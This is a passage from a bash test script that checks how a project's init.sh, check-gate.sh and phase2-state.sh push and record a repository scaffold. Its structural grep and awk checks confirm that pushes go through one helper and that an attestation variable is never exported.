g2_rc2="$( cd "$G2" && PATH="$G2BIN:$PATH" bash "$CHECK_GATE" --repair --branch-protection-attested </dev/null >/dev/null 2>&1; echo $? )"
if [ "$g2_said" -ge 1 ] && [ "$g2_landed" = "$(head_of "$G2")" ] && [ "$(att_count "$G2")" = "1" ] && [ "$g2_rc2" = "0" ]; then
  pass "G2: check-gate.sh's BL-157 message names scripts/check-gate.sh --repair, that command lands the scaffold, and the flagged re-run it names then passes"
else
  fail_ "G2" "named=$g2_said bare main=$g2_landed records=$(att_count "$G2") flagged re-run rc=$g2_rc2; said: $(printf '%s' "$g2_msg" | grep -m1 'preconditions' | cut -c1-200) repair: $(printf '%s' "$g2_out" | grep -m3 -E 'FAIL|BLOCKED|Repair' | tr '\n' '|')"
fi

echo ""
echo "=== S. the call sites, by structure ==="

# _code FILE — the file without whole-line comments.
_code() { grep -v '^[[:space:]]*#' "$1"; }
s_init_byo="$(_code "$INIT_SH" | grep -c '_phase2_push_scaffold git push -u origin')"
s_init_host="$(_code "$INIT_SH" | grep -c '_phase2_push_scaffold host_push_initial')"
s_gate="$(_code "$CHECK_GATE" | grep -c '_phase2_push_scaffold host_push_initial')"
# A push of main or master that is a COMMAND (at the head of a line, or after
# `if !`, `||` or `&&`) and not inside the helper. Strings that name the
# command for the operator to type (print_info "  git push -u origin main")
# start with a quote and are not commands.
S_BYPASS_RE='(^|if !|\|\||&&)[[:space:]]*(host_push_initial|git push -u origin) (main|master)'
s_bypass="$( { _code "$INIT_SH"; _code "$CHECK_GATE"; } | grep -cE "$S_BYPASS_RE")"
if [ "$s_init_byo" = "1" ] && [ "$s_init_host" = "1" ] && [ "$s_gate" = "1" ] && [ "$s_bypass" = "0" ]; then
  pass "S1: init.sh's bring-your-own-host and first-class sites and check-gate.sh --repair each push through _phase2_push_scaffold, and none pushes main or master around it"
else
  fail_ "S1" "init byo=$s_init_byo (want 1) init host=$s_init_host (want 1) check-gate=$s_gate (want 1) direct pushes=$s_bypass (want 0): $( { _code "$INIT_SH"; _code "$CHECK_GATE"; } | grep -E "$S_BYPASS_RE" | head -2 | cut -c1-120 | tr '\n' '|')"
fi

s_export="$( for f in "$INIT_SH" "$CHECK_GATE" "$PHASE2" "$REPO_ROOT/scripts/lib/host.sh" "$REPO_ROOT"/scripts/host-drivers/*.sh; do
  _code "$f"; done | grep -cE '(export|declare -x|typeset -x)[[:space:]].*SOLO_PR_REVIEW_ATTESTED' )"
if [ "$s_export" = "0" ]; then
  pass "S2: nothing on the scaffold-push path exports SOLO_PR_REVIEW_ATTESTED — an export in init.sh would cover every push it makes after, and no unit case runs init.sh"
else
  fail_ "S2" "$s_export exporting line(s) on the scaffold-push path"
fi

# S3 — init.sh's half, which only the full-lane init suite runs: the record call
# exists once, sits inside the freshness arm, and freshness counts dotfiles.
# Spelled exactly, because each atom is a width: drop the call and #421 is back;
# `if true` records over an operator's files; `ls` without -A misses .github/.
s_rec_calls="$(_code "$INIT_SH" | grep -c '_phase2_record_scaffold')"
s_rec_arm="$(_code "$INIT_SH" | awk '/^[[:space:]]*$/ {next} /_phase2_record_scaffold/ {print prev; exit} {prev=$0}' | sed 's/^[[:space:]]*//')"
s_fresh_sets="$(_code "$INIT_SH" | grep -c '^[[:space:]]*SCAFFOLD_DIR_FRESH=true[[:space:]]*$')"
s_fresh_test="$(_code "$INIT_SH" | awk '/^[[:space:]]*$/ {next} /^[[:space:]]*SCAFFOLD_DIR_FRESH=true[[:space:]]*$/ {print prev; exit} {prev=$0}' | sed 's/^[[:space:]]*//')"
S3_WANT_ARM='if [ "$SCAFFOLD_DIR_FRESH" = true ]; then'
S3_WANT_TEST='if [ ! -e "$PROJECT_DIR" ] || [ -z "$(ls -A "$PROJECT_DIR" 2>/dev/null)" ]; then'
# Every assignment of the flag, in order: false before the test, true inside its
# arm, nothing else anywhere (a default of true, or a reset after the arm).
s_fresh_seq="$(_code "$INIT_SH" | grep -o 'SCAFFOLD_DIR_FRESH=[^[:space:];]*' | tr '\n' ' ')"
s_fresh_before="$(_code "$INIT_SH" | awk '/^[[:space:]]*$/ {next} index($0, "ls -A \"$PROJECT_DIR\"") {print prev; exit} {prev=$0}' | sed 's/^[[:space:]]*//')"
if [ "$s_rec_calls" = "1" ] && [ "$s_rec_arm" = "$S3_WANT_ARM" ] && [ "$s_fresh_sets" = "1" ] && [ "$s_fresh_test" = "$S3_WANT_TEST" ] \
   && [ "$s_fresh_seq" = "SCAFFOLD_DIR_FRESH=false SCAFFOLD_DIR_FRESH=true " ] && [ "$s_fresh_before" = "SCAFFOLD_DIR_FRESH=false" ]; then
  pass "S3: init.sh calls _phase2_record_scaffold exactly once, inside the SCAFFOLD_DIR_FRESH arm; the flag is set false before an 'ls -A' test and true only inside it"
else
  fail_ "S3" "record calls=$s_rec_calls (want 1); line before it='$s_rec_arm'; fresh=true lines=$s_fresh_sets (want 1); test before it='$s_fresh_test'; assignments in order='$s_fresh_seq' (want false then true); line before the test='$s_fresh_before'"
fi

# S4 — the attested prefix runs only inside a subshell (# BL-323-ATTEST-SUBSHELL).
# Q6 kills a missing subshell only where bash keeps a prefix assignment after a
# function returns (POSIX mode, 3.2-5.0); CI's 5.2 discards it, so this structural
# pin is what lets the PR lane see the subshell go.
s4_lines="$(_code "$PHASE2" | grep -c 'SOLO_PR_REVIEW_ATTESTED=1')"
s4_sub="$(_code "$PHASE2" | grep -c '^[[:space:]]*([[:space:]]*SOLO_PR_REVIEW_ATTESTED=1 .*)[[:space:]]*$')"
if [ "$s4_lines" = "1" ] && [ "$s4_sub" = "1" ]; then
  pass "S4: phase2-state.sh sets SOLO_PR_REVIEW_ATTESTED=1 exactly once, as a prefix inside a ( … ) subshell"
else
  fail_ "S4" "attested-prefix lines=$s4_lines (want 1); inside a subshell=$s4_sub (want 1)"
fi

echo ""
echo "Results: $PASSED passed, $FAILED failed"
[ "$FAILED" -eq 0 ]
